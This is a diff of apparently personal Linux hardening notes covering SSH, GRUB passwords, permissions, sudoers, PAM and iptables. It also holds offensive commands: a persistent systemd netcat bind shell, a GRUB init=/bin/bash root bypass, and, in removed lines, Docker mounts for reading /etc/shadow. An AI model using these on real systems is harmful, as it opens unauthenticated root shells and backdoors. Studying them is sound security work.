@@ -1,101 +1,102 @@
+########################################### BASH SCRIPT FIRST ENTRY ###########################################
+#!/bin/bash (interpretata dal kernel per capire chi lancia l'eseguibile)
 
-#!/bin/bash
-#interpretata dal kernel per capire chi lancia l'eseguibile
-
-#nc shell
-#!/bin/bash
-nc -vlp 1337 -e /bin/bash #sulla macchina che si mette in ascolto 
-
-nc -nv 192.168.65.3 1337 #sulla macchina che vuole connettersi alla shel
-
-#avvio rw del GRUB (premere e sulla finestra di grub per avviare la configurazione)
-/boot/vmlinuz-6.1.0-13-arm64 root=UUID=b52670a7-6e95-4785-a380-c85602087f35 rw init=/bin/bash #entry modificata
-
-#GRUB pwd setup
-sudo nano /etc/grub.d/40_custom
-set superusers="root"
-password root root
-sudo update-grub
-
-#checking dir ownership
-ls -ld /var/log
-
-#make files accessible only by root
-sudo chown root:root /path/to/application
-sudo chmod 700 /path/to/application
-
-#shows open files in a dir and which process uses them
-sudo lsof +D /var/log
-
-#find files or directory writeable about all users
-ls -l /home/foo/ | grep .*w.*w.*w
-sudo ls -l /home/foo | grep d.*w.*w.*w
-
-#password expiration time
-sudo chage -l foo #pwd info for user foo
-passwd -S foo #more pwd infos (username, status, last password change, minimum age change, maximum age change, days before a required change that warnings will be provided, days after password expires before it is locked)
-sudo chage -M 1 -m 0 foo #pwd cannot be used for more than 1 days and changed before it has been in effect for o days
-
-#docker privilege escalation
-docker run -v /etc/:/mnt -it image #we have access of the shadow file, 
-
-docker run -it -v /:/host/ image chroot /host/bash #Run the image mounting the host disk and chroot on it
-
-# systemctl
+##################################################### SSH #####################################################
 sudo systemctl | grep ssh
 sudo systemctl status ssh
 sudo systemctl enable ssh
 sudo systemctl start ssh
+sudo apt install openssh-server
 
-# ssh
 ip a 
-ssh utente@ip
+ssh utente@ip -p port
 
-#login diretto con root (c'è una password impostata per root)
-sudo cat /etc/shadow | grep root
-passwd --delete root #attenzione non disabilità l'accesso 
-passwd -l root #impedisce il login all'utente
 
-#configurazioni sudoers
+###################################### NETCAT REVERSE SHELL AND UNIT FILE #####################################
+
+touch /etc/systemd/system/open-shell.service
+
+	[Unit]
+	Description=Open shell on network using netcat
+
+	[Service]
+	ExecStart=/bin/nc -vlp port -e /bin/bash
+	Restart=always
+	StandardInput=socket
+
+sudo systemctl enable open-shell.service
+sudo systemctl start open-shell.service
+
+nc -nv ip port #connect to ip:port via netcat
+
+############################################## GRUB CONFIGURATION ##############################################
+
+/boot/vmlinuz-6.1.0-13-arm64 root=UUID=b52670a7-6e95-4785-a380-c85602087f35 rw init=/bin/bash #entry on grub configuration used to run SO in rw with root shell
+
+grub-mkpasswd-pbkdf2 #making hash of pwd 
+
+sudo nano /etc/grub.d/40_custom #on grub configuration file
+
+	set superusers="root"
+	password root hashPwd
+
+sudo update-grub
+sudo reboot
+
+################################################ RESOURCE INFOS ################################################
+ls -ld /var/log #dir ownership
+
+sudo lsof +D /var/log #shows open files in a dir and which process uses them
+
+ls -l /home/foo/ | grep .*w.*w.*w #shows files writeable by all users
+find /home/foo/ -type f -perm -o+w -exec ls -la {} \; #alternative solution
+
+sudo ls -l /home/foo | grep d.*w.*w.*w #shows directory writeable by all users
+find /home/foo/ -type d -perm -o+w -exec ls -lad {} \; #alternative solution
+
+
+##################################### MAKING FILE ACCESSIBLE ONLY BY ROOT #####################################
+sudo chown root:root /path/to/application
+sudo chmod 700 /path/to/application
+
+
+######################################## CHANGING PWD EXPIRATION TIME ########################################
+sudo chage -l foo #pwd info about user foo
+passwd -S foo #more pwd infos (username, status, last password change, minimum age change, maximum age change, days before a required change that warnings will be provided, days after password expires before it is locked)
+
+sudo chage -M 1 -m 0 foo #pwd cannot be used for more than 1 days and changed before it has been in effect for 0 days
+
+####################################### CHANGING SUDOERS CONFIGURATION #######################################
 root ALL = (ALL:ALL) ALL #user host(user:group) cmds (who where = (as_whom) what)
 %sudo ALL = (ALL:ALL) ALL #group host(user:group) cmds
 
-#suid e guid
+######################################## SEARCHING ALL EXEC WITH SUID ########################################
 sudo find / -type f -perm /4000 -exec ls -l {} \; #suid (-executable per eseguibili)
 sudo find / -type f -perm /2000 -exec ls -l {} \; #guid
 sudo find / -type f -perm /6000 -exec ls -l {} \; #both
 
-#pam password policy (/etc/pam.d/common-password)
-sudo apt-get install libpam-pwquality
-password	required	pam_pwquality.so retry=3 minlen=12 dcredit=-1 ocredit=-1 ucredit=-1
 
-#un utente generico è diventato root
-su - "utente" #mi loggo come l'utente
-hystory #hystory dei comandi dell'utente
-sudo visudo #controllo il file sudoers
-echo 'foobar ALL=(ALL:ALL) ALL' | sudo EDITOR='tee -a' visudo #edit sudoers from bash script
+######################################### CHANGING PAM PWD POLICYIES #########################################
+sudo apt-get install libpam-pwquality #pam module about pwd utilities
 
-sudo cat /etc/sudoers.d/ #file sudoers dei vari utenti
-sudo rm /etc/sudoers.d/"utente" #attenzione l'utente potrebbe essere in un gruppo con i permessi
+sudo nano /etc/pam.d/common-password
+	password	required	pam_pwquality.so retry=3 minlen=12 dcredit=-1 ocredit=-1 ucredit=-1 
 
-#firewal 
-sudo iptables -nvL #stampa tutte le regole del firewall
-sudo netstat -tulnp #controlla le porte aperte
+sudo systemctl restart systemd-logind #service reboot
 
-#a questo punto individuo il servizio esposto e lo confino a localhost
-#su mariadb
-#tee -a è un eseguible che mi fa fare append su un file
-echo "bind-address = 127.0.0.1" | sudo tee -a /etc/mysql/my.cnf
 
-#iptables
-sudo iptables -nvL #running config
+
+################################################## IPTABLES ##################################################
+sudo netstat -tulnp #check opened ports
+
+sudo iptables -nvL #shows all firewall rules
 sudo iptables --flush #delete the running configuration
 sudo iptables -t table #use table <table>
 sudo iptables -A chain #append to <chain> a rule
 
-#CHAINS: INPUT, OUTPUT, FORWARD
+#CHAINS --> INPUT, OUTPUT, FORWARD
 
-#PARAMETERS
+########### PARAMETERS ###########
 # -m state (state module)
 # -p protocol
 # -s/-d x.x.x.x/x (source/destination address)
@@ -103,27 +104,28 @@ sudo iptables -A chain #append to <chain> a rule
 # -i/-o interface (input/output interface)
 # --syn (tcp flags syn=1 ack=0)
 # ! (match in negativo)
+# -j (what to do if roule is matched)
 
-#TARGET
+############ TARGETS ############
 #ACCEPT 
 #DROP
 #REJECT 
 #<chain-name> (jump to specified chain, useful with user-defined chains)
 #RETURN (return to the calling chain)
 
-#configurazioni
-#accetta connessioni enstablish
-#cambia la regola di default in drop
-sudo iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT #-j indica cosa fare se la regola viene metchata
-sudo iptables -P INPUT DROP #-P regola di default
-sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
-sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
 
-sudo iptables-save #prendo la configurazione
+sudo iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT #accepting all enstablished connections
 
-sudo iptables-restore <<EOT <configurazione> EOT #applica la configurazione
+sudo iptables -P INPUT DROP #default roule DROP
+
+sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT #accepting new connection on port 22
 
 
+sudo iptables-save #shows running config
 
+#sudo iptables-restore <<EOT <configurazione> EOT #used to write firewall config
 
-
+#persisten roule saving
+sudo iptables-save | sudo tee /etc/network/iptables.up.rules
+sudo systemctl enable netfilter-persistent
+sudo systemctl start netfilter-persistent
